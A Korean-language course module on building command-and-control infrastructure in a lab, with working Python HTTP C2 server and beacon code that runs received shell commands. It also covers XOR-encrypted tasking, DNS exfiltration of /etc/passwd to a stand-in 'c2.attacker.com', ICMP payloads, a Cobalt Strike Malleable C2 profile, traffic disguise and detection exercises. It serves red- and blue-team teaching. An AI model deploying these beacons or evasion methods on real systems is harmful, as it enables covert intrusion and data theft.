# Week 07: C2 인프라 구축 — HTTP/DNS/ICMP C2, Cobalt Strike 개념, 은닉

## 학습 목표
- **C2(Command and Control)** 인프라의 아키텍처와 구성 요소를 심층 이해한다
- HTTP, DNS, ICMP 기반 C2 채널의 원리를 이해하고 구현할 수 있다
- **Cobalt Strike**, Sliver, Havoc 등 주요 C2 프레임워크의 구조와 기능을 설명할 수 있다
- C2 트래픽 은닉 기법(Domain Fronting, Malleable C2, JA3 핑거프린트 회피)을 이해한다
- **리디렉터(Redirector)**를 이용한 C2 인프라 보호 방법을 설계할 수 있다
- C2 통신의 탐지 기법과 네트워크 지표(IoC)를 분석할 수 있다
- MITRE ATT&CK Command and Control 전술의 세부 기법을 매핑할 수 있다

## 전제 조건
- HTTP/HTTPS 프로토콜과 DNS 프로토콜의 동작 원리를 이해하고 있어야 한다
- TCP/UDP 소켓 통신의 기본 개념을 알고 있어야 한다
- 리버스 셸의 원리를 이해하고 있어야 한다 (Week 01)
- Python 기초 네트워크 프로그래밍을 할 수 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | C2 서버 (교육용) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS (탐지 검증) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 피해 시스템 (비콘 대상) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | C2 아키텍처 + 프레임워크 이론 | 강의 |
| 0:35-1:10 | HTTP C2 구현 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | DNS C2 + ICMP C2 실습 | 실습 |
| 1:55-2:30 | C2 은닉 기법 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | C2 탐지 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: C2 아키텍처와 프레임워크 (35분)

## 1.1 C2 인프라 구조

```
+-------------------------------------------------------------------+
|                        C2 인프라 구조                                |
+-------------------------------------------------------------------+
|                                                                     |
|  [오퍼레이터]                                                       |
|       ↓                                                            |
|  [Team Server]  ←→  [데이터베이스]                                  |
|       ↓                                                            |
|  [리디렉터 1]  ←→  [CDN / Domain Front]                            |
|       ↓                                                            |
|  [리디렉터 2]  ←→  [합법적 도메인]                                  |
|       ↓                                                            |
|  [임플란트/비콘]  ←→  [피해 시스템]                                  |
|                                                                     |
+-------------------------------------------------------------------+
```

### C2 구성 요소

| 구성 요소 | 역할 | 예시 |
|----------|------|------|
| **Team Server** | C2 핵심 서버, 명령 관리 | Cobalt Strike Team Server |
| **Listener** | 비콘 연결 수신 | HTTP/HTTPS/DNS 리스너 |
| **Implant/Beacon** | 피해 시스템에 설치된 에이전트 | Beacon, Sliver implant |
| **Redirector** | 트래픽 중계, C2 서버 보호 | socat, nginx, CDN |
| **Stager** | 초기 다운로더 (작은 크기) | 1st stage payload |
| **Post-Exploitation** | 추가 도구/모듈 | Mimikatz, seatbelt |

### 주요 C2 프레임워크 비교

| 프레임워크 | 개발사 | 언어 | 라이선스 | 특징 |
|-----------|--------|------|---------|------|
| **Cobalt Strike** | HelpSystems | Java | 상용 ($3,500/년) | 업계 표준, Malleable C2 |
| **Sliver** | BishopFox | Go | 오픈소스 | 현대적, mTLS/WireGuard |
| **Havoc** | C5pider | C/C++ | 오픈소스 | Cobalt Strike 대안 |
| **Mythic** | its-a-feature | Python/Go | 오픈소스 | 모듈형, 다중 에이전트 |
| **Covenant** | cobbr | C# | 오픈소스 | .NET 특화 |
| **Metasploit** | Rapid7 | Ruby | 무료/Pro | 범용, 취약점 + C2 |

## 1.2 C2 통신 프로토콜 비교

| 프로토콜 | 포트 | 은닉성 | 대역폭 | 신뢰성 | 탐지 난이도 | ATT&CK |
|---------|------|--------|--------|--------|-----------|--------|
| HTTP | 80 | 높음 | 높음 | 높음 | 중간 | T1071.001 |
| HTTPS | 443 | 매우 높음 | 높음 | 높음 | 높음 | T1071.001 |
| DNS | 53 | 매우 높음 | 낮음 | 중간 | 높음 | T1071.004 |
| ICMP | - | 높음 | 낮음 | 낮음 | 높음 | T1095 |
| WebSocket | 80/443 | 높음 | 높음 | 높음 | 중간 | T1071.001 |
| SMB Named Pipe | 445 | 중간 | 중간 | 높음 | 중간 | T1071.002 |
| DoH (DNS over HTTPS) | 443 | 매우 높음 | 낮음 | 높음 | 매우 높음 | T1071.004 |

## 1.3 MITRE ATT&CK: Command and Control

| 기법 ID | 이름 | 설명 | 이번 주 실습 |
|---------|------|------|:---:|
| T1071 | Application Layer Protocol | 응용 계층 프로토콜 | ✓ |
| T1071.001 | Web Protocols | HTTP/HTTPS | ✓ |
| T1071.004 | DNS | DNS C2 | ✓ |
| T1095 | Non-Application Layer Protocol | ICMP 등 | ✓ |
| T1572 | Protocol Tunneling | 터널링 | ✓ |
| T1090 | Proxy | 리디렉터/프록시 | ✓ |
| T1090.004 | Domain Fronting | 도메인 프론팅 | △ |
| T1001 | Data Obfuscation | 데이터 난독화 | ✓ |
| T1573 | Encrypted Channel | 암호화 채널 | ✓ |
| T1008 | Fallback Channels | 대체 채널 | △ |
| T1104 | Multi-Stage Channels | 다단계 채널 | △ |
| T1571 | Non-Standard Port | 비표준 포트 | ✓ |

---

# Part 2: HTTP C2 구현 실습 (35분)

## 2.1 HTTP C2 설계

HTTP C2는 정상적인 웹 트래픽에 명령과 결과를 숨기는 방식이다.

```
[HTTP C2 통신 흐름]

비콘 → C2: GET /api/v1/status (체크인, 30초 간격)
C2 → 비콘: 200 OK {"task_id": "abc", "command": "whoami"}

비콘 → C2: POST /api/v1/result (결과 전송)
           {"task_id": "abc", "output": "root"}
C2 → 비콘: 200 OK {"task_id": null}  (대기)
```

## 실습 2.1: HTTP C2 서버/비콘 구현

> **실습 목적**: Python으로 간단한 HTTP C2 서버와 비콘을 구현하여 C2 통신의 원리를 이해한다
>
> **배우는 것**: HTTP 폴링 기반 C2의 구조, 명령 전달/결과 회수, 비콘 간격 설정을 배운다
>
> **결과 해석**: 비콘이 C2에 체크인하고 명령을 수신·실행·결과 전송하면 성공이다
>
> **실전 활용**: 실제 C2 프레임워크의 내부 동작 원리를 이해하는 데 활용한다
>
> **명령어 해설**: Flask/http.server로 C2 서버를 구현하고 requests로 비콘을 구현한다
>
> **트러블슈팅**: 포트 충돌 시 다른 포트를 사용하고, 방화벽에서 해당 포트를 허용한다

```bash
# HTTP C2 서버 구현
cat > /tmp/c2_server.py << 'C2SERVER'
#!/usr/bin/env python3
"""교육용 HTTP C2 서버"""
import http.server
import json
import threading
import time

# 명령 큐
tasks = []
results = []

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/beacon':
            # 비콘 체크인 → 대기 중인 명령 전달
            if tasks:
                task = tasks.pop(0)
                response = json.dumps(task)
            else:
                response = json.dumps({"command": None})
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(response.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/result':
            length = int(self.headers.get('Content-Length', 0))
            body = json.loads(self.rfile.read(length))
            results.append(body)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # 로그 억제

if __name__ == '__main__':
    server = http.server.HTTPServer(('0.0.0.0', 8899), C2Handler)
    print("[C2] Server started on :8899")

    # 명령 추가 (교육용)
    tasks.append({"task_id": "001", "command": "hostname"})
    tasks.append({"task_id": "002", "command": "id"})
    tasks.append({"task_id": "003", "command": "uname -a"})

    # 10초 후 자동 종료
    timer = threading.Timer(10.0, server.shutdown)
    timer.daemon = True
    timer.start()

    server.serve_forever()
    print(f"[C2] Results received: {len(results)}")
    for r in results:
        print(f"  [{r.get('task_id')}] {r.get('output','')[:100]}")
C2SERVER

# HTTP C2 비콘 구현
cat > /tmp/c2_beacon.py << 'C2BEACON'
#!/usr/bin/env python3
"""교육용 HTTP C2 비콘"""
import urllib.request
import json
import subprocess
import time

C2_URL = "http://localhost:8899"
SLEEP = 2  # 비콘 간격 (초)

for _ in range(5):
    try:
        # 체크인
        req = urllib.request.urlopen(f"{C2_URL}/beacon", timeout=3)
        task = json.loads(req.read())

        if task.get("command"):
            # 명령 실행
            cmd = task["command"]
            try:
                output = subprocess.check_output(cmd, shell=True, timeout=5).decode().strip()
            except Exception as e:
                output = f"Error: {e}"

            # 결과 전송
            result = json.dumps({"task_id": task["task_id"], "output": output})
            req = urllib.request.Request(
                f"{C2_URL}/result",
                data=result.encode(),
                headers={"Content-Type": "application/json"},
                method='POST'
            )
            urllib.request.urlopen(req, timeout=3)
            print(f"[Beacon] Executed: {cmd} → {output[:50]}")
        else:
            print("[Beacon] No tasks, sleeping...")
    except Exception as e:
        print(f"[Beacon] Error: {e}")

    time.sleep(SLEEP)
C2BEACON

# 실행
echo "=== HTTP C2 서버 + 비콘 실행 ==="
python3 /tmp/c2_server.py &
C2_PID=$!
sleep 1
python3 /tmp/c2_beacon.py
wait $C2_PID 2>/dev/null

# 정리
rm -f /tmp/c2_server.py /tmp/c2_beacon.py
echo "[HTTP C2 데모 완료]"
```

## 실습 2.2: 암호화 HTTP C2

> **실습 목적**: C2 통신에 암호화를 적용하여 네트워크 모니터링을 우회하는 기법을 배운다
>
> **배우는 것**: AES/XOR 기반 페이로드 암호화, base64 인코딩, HTTPS 사용을 배운다
>
> **결과 해석**: 네트워크 캡처에서 명령과 결과가 보이지 않으면 암호화가 성공한 것이다
>
> **실전 활용**: 실제 C2 프레임워크는 기본적으로 AES-256 또는 ChaCha20으로 통신을 암호화한다
>
> **명령어 해설**: XOR 키로 페이로드를 암호화/복호화하는 간단한 구현이다
>
> **트러블슈팅**: 암호화된 데이터가 깨지면 인코딩(UTF-8/base64)을 확인한다

```bash
# 암호화 C2 통신 시뮬레이션
python3 << 'PYEOF'
import base64
import json

print("=== 암호화 C2 통신 시뮬레이션 ===")
print()

# XOR 암호화/복호화 함수
def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data.encode())])

def xor_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)]).decode()

KEY = b"SecretC2Key2025!"

# 1. 명령 암호화
command = "whoami && cat /etc/passwd | head -3"
encrypted = xor_encrypt(command, KEY)
b64_encrypted = base64.b64encode(encrypted).decode()

print(f"[C2→비콘] 원본 명령: {command}")
print(f"[C2→비콘] 암호화+b64: {b64_encrypted}")
print(f"[네트워크 캡처] 보이는 것: {b64_encrypted[:40]}... (의미 불명)")
print()

# 2. 비콘에서 복호화
decrypted_cmd = xor_decrypt(base64.b64decode(b64_encrypted), KEY)
print(f"[비콘] 복호화된 명령: {decrypted_cmd}")
print()

# 3. 결과 암호화
result = "root\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
enc_result = base64.b64encode(xor_encrypt(result, KEY)).decode()
print(f"[비콘→C2] 결과 암호화: {enc_result[:50]}...")
dec_result = xor_decrypt(base64.b64decode(enc_result), KEY)
print(f"[C2] 복호화된 결과:\n{dec_result}")
print()

# 비교: 평문 vs 암호화
print("=== 네트워크 관점 비교 ===")
print(f"평문 HTTP: POST /result {{'output': '{result[:30]}...'}}")
print(f"암호화 HTTP: POST /result {{'data': '{enc_result[:30]}...'}}")
print("[결론] 암호화 시 IDS가 내용을 분석할 수 없음")
PYEOF
```

---

# Part 3: DNS C2와 ICMP C2 (35분)

## 3.1 DNS C2 상세 구현

DNS C2는 DNS 프로토콜의 쿼리와 응답에 데이터를 인코딩하여 전달한다.

```
[DNS C2 데이터 흐름]

명령 전달 (C2→비콘):
  비콘: TXT 쿼리 → cmd.c2domain.com
  C2 DNS: TXT 응답 → "d2hvYW1p" (base64: "whoami")

결과 회수 (비콘→C2):
  비콘: A 쿼리 → cm9vdA.result.c2domain.com
                  ^^^^^^
                  base64("root")를 서브도메인에 인코딩

장점: DNS(53)는 거의 항상 허용됨
단점: 대역폭 매우 제한 (서브도메인 최대 63자)
```

## 실습 3.1: DNS C2 원리 시뮬레이션

> **실습 목적**: DNS 프로토콜에 데이터를 인코딩하여 C2 통신하는 원리를 구현한다
>
> **배우는 것**: DNS 쿼리/응답에 데이터를 인코딩/디코딩하는 기법과 대역폭 제한을 배운다
>
> **결과 해석**: 인코딩된 데이터가 DNS 형태로 전송되고 정확히 복원되면 성공이다
>
> **실전 활용**: dnscat2, iodine 등 실제 DNS 터널링 도구의 내부 동작 원리를 이해한다
>
> **명령어 해설**: base64 인코딩을 서브도메인에 삽입하여 DNS 쿼리로 데이터를 전송한다
>
> **트러블슈팅**: 서브도메인 길이 제한(63자)으로 큰 데이터는 분할이 필요하다

```bash
# DNS C2 데이터 인코딩/디코딩 시뮬레이션
python3 << 'PYEOF'
import base64

print("=== DNS C2 시뮬레이션 ===")
print()

C2_DOMAIN = "c2.attacker.com"
MAX_LABEL = 63  # DNS 라벨 최대 길이

def encode_for_dns(data):
    """데이터를 DNS 서브도메인으로 인코딩"""
    b64 = base64.b64encode(data.encode()).decode()
    # DNS 안전 문자로 변환
    dns_safe = b64.replace('+', '-').replace('/', '_').replace('=', '')
    # 63자 단위로 분할
    labels = [dns_safe[i:i+MAX_LABEL] for i in range(0, len(dns_safe), MAX_LABEL)]
    return labels

def decode_from_dns(labels):
    """DNS 서브도메인에서 데이터 디코딩"""
    dns_safe = ''.join(labels)
    b64 = dns_safe.replace('-', '+').replace('_', '/')
    # 패딩 복원
    b64 += '=' * (4 - len(b64) % 4) if len(b64) % 4 else ''
    return base64.b64decode(b64).decode()

# 1. 명령 전달 (TXT 레코드 응답)
command = "cat /etc/passwd | head -5"
encoded_cmd = base64.b64encode(command.encode()).decode()
print(f"[C2→비콘] 명령: {command}")
print(f"  DNS TXT 응답: \"{encoded_cmd}\"")
print()

# 2. 결과 회수 (서브도메인에 인코딩)
result = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1"
labels = encode_for_dns(result)
print(f"[비콘→C2] 결과: {result[:40]}...")
print(f"  DNS 쿼리 (분할):")
for i, label in enumerate(labels):
    fqdn = f"{label}.{i}.exfil.{C2_DOMAIN}"
    print(f"    쿼리 {i}: {fqdn}")
    print(f"    (라벨 길이: {len(label)}자)")

print()

# 3. 복원
restored = decode_from_dns(labels)
print(f"[C2] 복원된 결과: {restored}")
print(f"[검증] 원본==복원: {result == restored}")

print()
print("=== DNS C2 통계 ===")
print(f"  원본 데이터: {len(result)} 바이트")
print(f"  DNS 쿼리 수: {len(labels)}개")
print(f"  전송 효율: {len(result) / sum(len(l) for l in labels) * 100:.1f}%")
print(f"  실제 대역폭: ~50 바이트/쿼리 (매우 느림)")
PYEOF
```

## 3.2 ICMP C2

ICMP(Internet Control Message Protocol) 터널링은 ping 패킷의 데이터 영역에 C2 데이터를 삽입한다.

```
[ICMP Echo Request 구조]
+--------+--------+----------------+------------------+
| Type=8 | Code=0 | Checksum       | ID   | Seq       |
+--------+--------+----------------+------------------+
| Data (페이로드) — 여기에 C2 데이터 삽입!              |
+------------------------------------------------------+
```

## 실습 3.2: ICMP C2 원리 시뮬레이션

> **실습 목적**: ICMP 패킷에 데이터를 삽입하여 C2 통신하는 원리를 이해한다
>
> **배우는 것**: ping 패킷의 데이터 영역 활용, ICMP 터널링의 장단점을 배운다
>
> **결과 해석**: ICMP 데이터 영역에서 인코딩된 명령을 추출할 수 있으면 성공이다
>
> **실전 활용**: 방화벽이 TCP/UDP를 차단하지만 ICMP를 허용하는 환경에서 활용한다
>
> **명령어 해설**: ping -p 옵션으로 ICMP 페이로드에 데이터를 삽입한다
>
> **트러블슈팅**: ICMP가 차단되면 다른 프로토콜(DNS)로 폴백한다

```bash
# ICMP C2 시뮬레이션
echo "=== ICMP C2 원리 ==="

# ping의 -p 옵션으로 데이터 삽입
echo "--- ICMP 데이터 삽입 테스트 ---"
# "whoami"를 hex로 변환
DATA_HEX=$(echo -n "whoami" | xxd -p)
echo "명령 'whoami' → hex: $DATA_HEX"

# ping에 데이터 포함 (1회)
echo 1 | sudo -S ping -c 1 -p "$DATA_HEX" 10.20.30.80 2>/dev/null | head -3

echo ""
echo "--- tcpdump로 ICMP 데이터 확인 ---"
# 백그라운드에서 캡처
echo 1 | sudo -S timeout 3 tcpdump -i any icmp -c 2 -X 2>/dev/null &
sleep 1
echo 1 | sudo -S ping -c 1 -p "$DATA_HEX" 10.20.30.80 2>/dev/null > /dev/null
wait 2>/dev/null

echo ""
echo "=== ICMP C2 도구 ==="
echo "  icmpsh: Windows 리버스 ICMP 셸"
echo "  ptunnel: TCP over ICMP 터널"
echo "  hans: IP over ICMP VPN"
echo ""
echo "=== 탐지 포인트 ==="
echo "  1. 비정상적으로 큰 ICMP 패킷 크기"
echo "  2. 높은 빈도의 ICMP 트래픽"
echo "  3. ICMP 데이터 영역의 비표준 내용"
echo "  4. 단방향이 아닌 양방향 ICMP 통신"
```

---

# Part 4: C2 은닉과 탐지 (35분)

## 4.1 C2 은닉 기법

### Domain Fronting

```
[Domain Fronting 원리]
HTTPS 요청:
  TLS SNI: legitimate-cdn.com    (방화벽이 보는 것)
  HTTP Host: c2.attacker.com      (CDN이 라우팅하는 것)

방화벽 → "legitimate-cdn.com 접속이네, 허용"
CDN → Host 헤더 확인 → c2.attacker.com으로 전달
결과 → C2 서버에 도달!
```

### Malleable C2 (Cobalt Strike)

Malleable C2 프로파일은 C2 트래픽을 **정상 웹 트래픽처럼 위장**하는 설정이다.

```
# Google 검색 트래픽으로 위장하는 예시
http-get {
    set uri "/search?q=recent+news";
    client {
        header "Host" "www.google.com";
        header "Accept" "text/html";
        metadata {
            base64url;
            prepend "PREF=ID=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "text/html; charset=UTF-8";
        output {
            base64;
            prepend "<!DOCTYPE html><html>";
            append "</html>";
            print;
        }
    }
}
```

### JA3/JA3S 핑거프린트

TLS 핸드셰이크의 Client Hello 메시지에서 추출하는 핑거프린트로, C2 클라이언트를 식별하는 데 사용된다.

| 요소 | 설명 |
|------|------|
| TLS 버전 | TLS 1.2, 1.3 |
| Cipher Suites | 지원 암호 목록 |
| Extensions | 확장 기능 목록 |
| EC Curves | 타원 곡선 |
| EC Point Formats | 포인트 형식 |

## 실습 4.1: C2 트래픽 위장 기법

> **실습 목적**: C2 트래픽을 정상 웹 트래픽으로 위장하는 기법을 구현한다
>
> **배우는 것**: User-Agent 변경, 정상 URL 패턴 모방, 응답 위장 기법을 배운다
>
> **결과 해석**: 네트워크 캡처에서 C2 트래픽이 정상 웹 트래픽과 구별되지 않으면 성공이다
>
> **실전 활용**: Red Team 작전에서 C2 트래픽의 OPSEC 유지에 필수적이다
>
> **명령어 해설**: HTTP 헤더와 URL 패턴을 합법적 서비스와 동일하게 설정한다
>
> **트러블슈팅**: JA3 핑거프린트까지 위장하려면 TLS 라이브러리 설정을 변경해야 한다

```bash
# C2 트래픽 위장 시뮬레이션
python3 << 'PYEOF'
import json
import base64

print("=== C2 트래픽 위장 기법 ===")
print()

# 1. 정상 웹 트래픽으로 위장
print("[기법 1] Google API 위장")
c2_command = base64.b64encode(b"whoami").decode()
fake_google_response = {
    "kind": "customsearch#search",
    "url": {"type": "application/json", "template": "https://www.googleapis.com/customsearch/v1?q={searchTerms}"},
    "queries": {"request": [{"searchTerms": c2_command}]},  # 명령이 여기 숨겨짐
    "items": [{"title": "Normal search result", "link": "https://example.com"}]
}
print(f"  응답 (정상처럼 보임):")
print(f"  {json.dumps(fake_google_response, indent=2)[:200]}...")
print()

# 2. 이미지에 데이터 숨기기
print("[기법 2] 이미지 스테가노그래피")
print("  정상: GET /images/logo.png → PNG 이미지")
print("  C2: GET /images/logo.png → PNG 이미지 + 뒤에 암호화 명령 부착")
print("  방법: PNG EOF 마커 뒤에 데이터 추가 (이미지는 정상 표시)")
print()

# 3. HTTP 헤더에 숨기기
print("[기법 3] HTTP 헤더 활용")
headers = {
    "Host": "www.microsoft.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml",
    "Cookie": f"MUID={c2_command}",  # 명령이 쿠키에 숨겨짐
    "X-Request-ID": "a1b2c3d4-e5f6-7890",
}
print("  요청 헤더 (정상처럼 보임):")
for k, v in headers.items():
    print(f"    {k}: {v}")
print()

# 4. Malleable C2 프로파일 비교
print("[기법 4] Malleable C2 효과")
print("  기본 Cobalt Strike:")
print("    GET /beacon.bin?id=12345 → 즉시 탐지!")
print("  Malleable C2 적용:")
print("    GET /api/v3/content/articles?page=2&lang=en → 정상 API처럼 보임")
PYEOF
```

## 실습 4.2: C2 트래픽 탐지

> **실습 목적**: 네트워크에서 C2 트래픽을 탐지하는 방법을 학습한다
>
> **배우는 것**: 비콘 간격 분석, 데이터 크기 분석, JA3 핑거프린트 등 C2 탐지 기법을 배운다
>
> **결과 해석**: 주기적 HTTP 요청, 비정상 DNS 패턴 등이 발견되면 C2 의심이다
>
> **실전 활용**: Blue Team이 네트워크에서 C2 통신을 탐지하고 차단하는 데 활용한다
>
> **명령어 해설**: 네트워크 트래픽 통계 분석으로 C2 패턴을 식별한다
>
> **트러블슈팅**: 암호화된 C2는 메타데이터(시간, 크기, 빈도)로 탐지한다

```bash
echo "=== C2 탐지 기법 ==="
echo ""

echo "[1] 주기적 비콘 패턴 탐지"
echo "  정상 트래픽: 불규칙한 시간 간격"
echo "  C2 비콘: 30초, 60초 등 일정 간격"
echo "  탐지: 시간 간격의 표준편차가 매우 낮으면 C2 의심"
echo ""

echo "[2] DNS 이상 탐지"
echo "--- 최근 DNS 쿼리 통계 ---"
sshpass -p1 ssh secu@10.20.30.1 \
  "cat /var/log/suricata/dns.log 2>/dev/null | tail -5 || echo 'DNS 로그 없음'" 2>/dev/null

echo ""
echo "[3] HTTP 이상 탐지"
echo "  - 동일 URL에 대한 반복 요청"
echo "  - 비정상적으로 큰/작은 응답 크기"
echo "  - User-Agent와 TLS 핑거프린트 불일치"
echo ""

echo "[4] Suricata C2 규칙"
sshpass -p1 ssh secu@10.20.30.1 \
  "grep -r 'C2\|beacon\|cobalt\|command.and.control' /etc/suricata/rules/ 2>/dev/null | head -5 || echo 'C2 규칙 없음'" 2>/dev/null

echo ""
echo "[5] 네트워크 베이스라인 비교"
echo "--- 현재 연결 통계 ---"
ss -s 2>/dev/null || netstat -s 2>/dev/null | head -10

echo ""
echo "=== C2 IoC (Indicators of Compromise) ==="
echo "  네트워크: 주기적 아웃바운드 HTTP, DNS TXT 다량, ICMP 대형 패킷"
echo "  호스트: 비정상 프로세스, 시작프로그램, 크론잡"
echo "  파일: 암호화 설정파일, 인코딩 스크립트, 숨김 디렉토리"
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | C2 아키텍처 이해 | 구두 설명 | 5개 구성요소 설명 |
| 2 | HTTP C2 구현 | Python 서버/비콘 | 명령 전달/결과 회수 |
| 3 | C2 암호화 | XOR/base64 | 네트워크에서 불가시 |
| 4 | DNS C2 원리 | 인코딩 시뮬레이션 | 서브도메인 데이터 전송 |
| 5 | ICMP C2 원리 | ping -p | 데이터 삽입 확인 |
| 6 | Domain Fronting | 구조 설명 | SNI vs Host 차이 |
| 7 | Malleable C2 | 프로파일 분석 | 트래픽 위장 이해 |
| 8 | C2 탐지 | 패턴 분석 | 비콘 간격 식별 |
| 9 | JA3 핑거프린트 | 개념 설명 | TLS 핑거프린팅 이해 |
| 10 | 프레임워크 비교 | 비교표 | 5개 이상 비교 |

---

## 자가 점검 퀴즈

**Q1.** C2 프레임워크에서 리디렉터(Redirector)의 역할은?

<details><summary>정답</summary>
리디렉터는 C2 서버와 비콘 사이에 위치하여 트래픽을 중계하며, C2 서버의 실제 IP를 숨긴다. 리디렉터가 탐지되어 차단되더라도 C2 서버는 안전하게 유지되며, 새로운 리디렉터로 교체할 수 있다. 방어자에게는 리디렉터의 IP만 노출된다.
</details>

**Q2.** DNS C2가 대역폭 제한이 심한 이유는?

<details><summary>정답</summary>
DNS 라벨(서브도메인)의 최대 길이가 63자이고, 전체 도메인 이름은 253자로 제한된다. base64 인코딩 후에는 실제 전송 가능한 데이터가 더 줄어든다. 또한 DNS 쿼리 빈도가 높으면 탐지되므로 속도 제한이 필요하여, 실질 대역폭은 수 KB/s 수준이다.
</details>

**Q3.** Domain Fronting이 작동하는 원리를 설명하라.

<details><summary>정답</summary>
HTTPS 연결에서 TLS SNI(Server Name Indication)에는 합법적 도메인을, HTTP Host 헤더에는 C2 도메인을 설정한다. 방화벽은 암호화 전의 SNI만 보므로 합법적 접속으로 판단하여 허용하고, CDN은 복호화 후 Host 헤더를 확인하여 C2 서버로 트래픽을 전달한다.
</details>

**Q4.** Cobalt Strike의 Malleable C2 프로파일이란?

<details><summary>정답</summary>
C2 트래픽의 네트워크 지표(URL, 헤더, 본문 형식, 인코딩 등)를 커스터마이징하는 설정 파일이다. 정상적인 웹 서비스(Google, Microsoft, Amazon 등)의 트래픽 패턴을 모방하여 IDS/네트워크 분석을 우회한다. HTTP 요청/응답 구조, 비콘 간격, 데이터 인코딩 방식 등을 세밀하게 제어한다.
</details>

**Q5.** C2 비콘의 주기적 통신 패턴을 탐지하는 방법은?

<details><summary>정답</summary>
동일 목적지에 대한 HTTP 요청의 시간 간격을 분석하여, 표준편차가 매우 낮은(일정 간격) 패턴을 찾는다. 정상 사용자 트래픽은 불규칙하지만, C2 비콘은 설정된 간격(±지터)으로 통신하므로 통계적으로 구별 가능하다. 지터(jitter)가 추가되어도 패턴이 완전히 사라지지는 않는다.
</details>

**Q6.** HTTP C2와 DNS C2를 함께 사용하는 이유는?

<details><summary>정답</summary>
다중 채널(Fallback)을 확보하기 위해서이다. HTTP C2가 차단되면 DNS C2로 전환하여 통신을 유지한다. HTTP는 대역폭이 높아 주 채널로 사용하고, DNS는 거의 차단되지 않으므로 비상 채널(backup)로 사용한다. 이를 MITRE ATT&CK에서 T1008 (Fallback Channels)로 분류한다.
</details>

**Q7.** JA3 핑거프린트로 C2를 탐지할 수 있는 원리는?

<details><summary>정답</summary>
JA3는 TLS Client Hello의 파라미터(TLS 버전, Cipher Suites, Extensions 등)를 해시한 것이다. C2 프레임워크의 TLS 라이브러리는 고유한 JA3 값을 생성하므로, 알려진 C2의 JA3 해시와 매칭하여 탐지할 수 있다. 예: Cobalt Strike의 기본 JA3는 공개 데이터베이스에 등록되어 있다.
</details>

**Q8.** ICMP C2가 방화벽을 우회할 수 있는 환경은?

<details><summary>정답</summary>
방화벽이 아웃바운드 TCP/UDP를 차단하지만 ICMP Echo(ping)는 허용하는 환경에서 유효하다. 일부 네트워크는 네트워크 진단을 위해 ICMP를 허용하므로, ICMP 패킷의 데이터 영역에 C2 명령과 결과를 인코딩하여 통신할 수 있다. 단, 대역폭이 매우 제한적이다.
</details>

**Q9.** Sliver와 Cobalt Strike의 주요 차이점 3가지는?

<details><summary>정답</summary>
1. 라이선스: Sliver는 오픈소스(무료), Cobalt Strike는 상용($3,500/년)
2. 통신: Sliver는 mTLS, WireGuard, DNS 지원, Cobalt Strike는 HTTP/HTTPS/DNS/SMB
3. 언어: Sliver는 Go로 작성(크로스 컴파일 용이), Cobalt Strike는 Java(서버)+C(Beacon)
</details>

**Q10.** 실습 환경에서 가장 은닉성 높은 C2 채널은?

<details><summary>정답</summary>
HTTPS(443) 기반 C2가 가장 은닉성이 높다. 이유: 1) 트래픽이 암호화되어 IDS가 내용 분석 불가, 2) HTTPS는 정상적으로 가장 많이 사용되는 프로토콜, 3) BunkerWeb WAF가 HTTPS를 처리하므로 정상 웹 트래픽과 혼합. DNS C2도 높은 은닉성이 있지만 대역폭이 극히 제한적이다.
</details>

---

## 과제

### 과제 1: C2 프레임워크 비교 분석 (개인)
Cobalt Strike, Sliver, Havoc, Mythic, Metasploit 5개 프레임워크를 비교하는 보고서를 작성하라. 지원 프로토콜, 에이전트 유형, 은닉 기능, 탐지 난이도, 비용 등을 포함할 것.

### 과제 2: 커스텀 C2 프로토콜 설계 (팀)
HTTP와 DNS를 혼합한 커스텀 C2 프로토콜을 설계하라. 통신 흐름, 데이터 인코딩, 암호화, 폴백 메커니즘, 비콘 간격 지터를 포함할 것. Python 프로토타입 코드를 작성하라.

### 과제 3: C2 탐지 규칙 작성 (팀)
이번 주 실습에서 구현한 HTTP/DNS/ICMP C2를 탐지할 수 있는 Suricata 규칙 5개를 작성하라. 각 규칙의 탐지 로직, 오탐 가능성, 개선 방안을 설명할 것.
